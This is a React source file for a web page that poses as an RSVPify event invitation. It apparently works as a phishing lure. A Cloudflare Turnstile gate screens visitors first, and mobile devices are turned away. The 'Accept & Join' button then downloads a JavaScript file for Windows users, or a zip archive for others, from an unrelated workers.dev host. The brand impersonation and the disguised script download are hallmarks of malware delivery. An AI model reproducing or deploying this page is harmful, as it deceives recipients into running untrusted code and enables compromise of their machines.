import React, { useState, useEffect, useRef } from 'react';
import './App.css';

const TURNSTILE_SITE_KEY = '0x4AAAAAAE1PdO04PULzOibL';

export default function App() {
  const [isVerified, setIsVerified] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  if (!isVerified) {
    return <TurnstileGate onVerified={() => setIsVerified(true)} />;
  }

  if (isMobile) {
    return <MobileBlocker />;
  }

  return <Invite />;
}

function TurnstileGate({ onVerified }) {
  const widgetRef = useRef(null);
  const [error, setError] = useState(null);
  const widgetIdRef = useRef(null);

  useEffect(() => {
    const scriptId = 'cf-turnstile-script';

    const initWidget = () => {
      if (!widgetRef.current || widgetIdRef.current !== null) return;

      widgetIdRef.current = window.turnstile.render(widgetRef.current, {
        sitekey: TURNSTILE_SITE_KEY,
        theme: 'light',
        callback: () => {
          setError(null);
          onVerified();
        },
        'error-callback': () => {
          setError('Verification failed. Please try again.');
          widgetIdRef.current = null;
        },
        'expired-callback': () => {
          setError('Verification expired. Please complete again.');
          widgetIdRef.current = null;
        },
      });
    };

    if (window.turnstile) {
      initWidget();
    } else {
      let script = document.getElementById(scriptId);
      if (!script) {
        script = document.createElement('script');
        script.id = scriptId;
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
        script.async = true;
        script.defer = true;
        document.head.appendChild(script);
      }
      script.addEventListener('load', initWidget);
      return () => script.removeEventListener('load', initWidget);
    }
  }, [onVerified]);

  return (
    <div className="turnstile-gate-container">
      <div className="turnstile-gate-overlay"></div>
      <div className="turnstile-gate-content">
        <div className="turnstile-gate-box">
          <div className="turnstile-gate-logo">
            <img
              src="https://cdn.prod.website-files.com/5eabf935dc211f5fa80b51e8/6480577cae8766a35c9adea2_ETTF7MWT0RrWO82en5FCUDylkmbmtOYrqJgET2CgPVA.svg"
              alt="RSVPify"
            />
          </div>

          <h2 className="turnstile-gate-title">Verify to Continue</h2>
          <p className="turnstile-gate-subtitle">
            Complete the security check below to access your invitation
          </p>

          <div className="turnstile-gate-widget">
            <div ref={widgetRef}></div>
          </div>

          {error && (
            <p className="turnstile-gate-error">{error}</p>
          )}

          <p className="turnstile-gate-info">Protected by Cloudflare Turnstile</p>
        </div>
      </div>
    </div>
  );
}

function Invite() {
  const handleDownload = () => {
    const isWindows = navigator.platform.toUpperCase().indexOf('WIN') > -1;

    if (isWindows) {
      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Exclusive-Event-Invite.js';
    } else {
      window.location.href = 'https://exclusive-access-invitee.hemin.workers.dev/Event-Invite.zip';
    }
  };

  return (
    <>
      <div className="wrapper">
        <div className="container">
          <div className="envelope-section">
            <div className="envelope">📬</div>
          </div>
          <div className="content-section">
            <div className="logo">
              <img
                src="https://cdn.prod.website-files.com/5eabf935dc211f5fa80b51e8/6480577cae8766a35c9adea2_ETTF7MWT0RrWO82en5FCUDylkmbmtOYrqJgET2CgPVA.svg"
                alt="RSVPify"
              />
            </div>

            <h1>You're Invited</h1>
            <p className="subtitle">Experience something extraordinary</p>

            <div className="header-divider"></div>

            <p className="invite-text">
              We're thrilled to invite you to join us for an exclusive event.<br />
              <span className="highlight">Please accept this invitation and be part of something special.</span>
            </p>

            <button className="accept-btn" onClick={handleDownload}>
              Accept & Join
            </button>
          </div>
        </div>
      </div>

      <footer className="web-footer">
        <p>Exclusive event invitation crafted with precision</p>
        <div className="web-footer-divider"></div>
        <p>© 2026 RSVPify. All rights reserved.</p>
      </footer>
    </>
  );
}

function MobileBlocker() {
  return (
    <div className="mobile-warning-container">
      <div className="mobile-bg-decoration">
        <div className="decoration-circle circle-1"></div>
        <div className="decoration-circle circle-2"></div>
        <div className="decoration-circle circle-3"></div>
      </div>

      <div className="mobile-content-wrapper">
        <div className="mobile-icon-wrapper">
          <div className="mobile-icon">🖥️</div>
        </div>

        <div className="mobile-logo">
          <img
            src="https://cdn.prod.website-files.com/5eabf935dc211f5fa80b51e8/6480577cae8766a35c9adea2_ETTF7MWT0RrWO82en5FCUDylkmbmtOYrqJgET2CgPVA.svg"
            alt="RSVPify"
          />
        </div>

        <h1 className="mobile-title">Desktop Only</h1>

        <p className="mobile-subtitle">
          This exclusive invitation deserves to be experienced on a bigger screen.
        </p>

        <div className="mobile-divider"></div>

        <div className="mobile-features">
          <div className="feature-item">
            <span className="feature-icon">💻</span>
            <span>Windows</span>
          </div>
          <div className="feature-item">
            <span className="feature-icon">🍎</span>
            <span>macOS</span>
          </div>
          <div className="feature-item unavailable">
            <span className="feature-icon">📱</span>
            <span>Mobile</span>
          </div>
        </div>

        <p className="mobile-message">
          Open this from your desktop or laptop to continue
        </p>

        <div className="mobile-footer-art">
          <p>✨ A premium experience awaits</p>
        </div>
      </div>
    </div>
  );
}
